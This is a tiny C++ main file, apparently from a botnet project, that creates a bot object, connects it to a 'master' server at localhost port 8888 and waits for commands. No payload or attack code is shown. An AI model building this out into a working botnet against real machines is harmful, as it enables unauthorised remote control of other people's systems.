#include "Bot.h"

int main(int argc, char* argv[]) {
	botnet::Bot bot;

	if (bot.ConnectToMaster("127.0.0.1", "8888")) {
		bot.ListenToMaster();
	}
	return 0;
}
